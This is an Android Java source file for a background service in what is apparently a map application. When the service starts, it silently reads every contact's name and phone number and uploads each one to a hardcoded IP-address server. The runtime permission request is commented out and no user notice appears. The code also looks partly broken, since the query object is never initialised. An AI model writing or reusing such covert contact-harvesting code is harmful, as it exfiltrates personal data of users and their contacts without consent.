package com.bhagya.mapapplication.activityclass;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.Manifest;
import android.app.Activity;
import android.content.ContentValues;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.util.Log;
import android.widget.ArrayAdapter;
import android.widget.ListView;

import com.androidquery.AQuery;
import com.androidquery.callback.AjaxCallback;
import com.androidquery.callback.AjaxStatus;

import org.json.JSONArray;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

public class contact_reciever extends Service {


    DatabaseHelper databaseHelper;
    ListView listView ;
    ArrayList<String> StoreContacts ;
    ArrayAdapter<String> arrayAdapter ;
    AQuery aQuery;
    Cursor cursor ;
    String name, phonenumber ;
    public  static final int RequestPermissionCode  = 1 ;

    public contact_reciever() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
       // return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
//        EnableRuntimePermission();
        GetContactsIntoArrayList();

    }



    public void GetContactsIntoArrayList(){
        String uploadurl="http://104.155.153.31/meromobile.com/inserContact.php";
        cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,null, null, null);

        while (cursor.moveToNext()) {

            name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));

            phonenumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            ContentValues cv=new ContentValues();
            cv.put("contactNo",phonenumber);
            cv.put("contactName",name);
//            databaseHelper.Insertcaontactinfo(cv);

            Map<String,Object> params = new HashMap<String,Object>();
            params.put("contactname",name);
            params.put("contactno",phonenumber);

            aQuery.ajax(uploadurl,params, JSONArray.class, new AjaxCallback<JSONArray>() {
                @Override
                public void callback(String url, JSONArray array, AjaxStatus status) {
                    super.callback(url, array, status);

                    Log.i("response", "REsponser:" + array);
                }
            });

          //  StoreContacts.add(name + " "  + ":" + " " + phonenumber);
        }

        cursor.close();

    }

    public void EnableRuntimePermission(){

        if (!ActivityCompat.shouldShowRequestPermissionRationale((Activity) getBaseContext()
                ,
                Manifest.permission.READ_CONTACTS)) {

                    ActivityCompat.requestPermissions((Activity) getBaseContext(),new String[]{
                            Manifest.permission.READ_CONTACTS}, RequestPermissionCode);

                } else {

                 //   Toast.makeText(contact_reciever.this,"CONTACTS permission allows us to Access CONTACTS app", Toast.LENGTH_LONG).show();

                }
    }

   // @Override
    public void onRequestPermissionsResult(int RC, String per[], int[] PResult) {

        switch (RC) {

            case RequestPermissionCode:

                if (PResult.length > 0 && PResult[0] == PackageManager.PERMISSION_GRANTED) {

                   // Toast.makeText(.this,"Permission Granted, Now your application can access CONTACTS.", Toast.LENGTH_LONG).show();

                } else {

                   // Toast.makeText(ReadContactList.this,"Permission Canceled, Now your application cannot access CONTACTS.", Toast.LENGTH_LONG).show();

                }
                break;
        }
    }



}
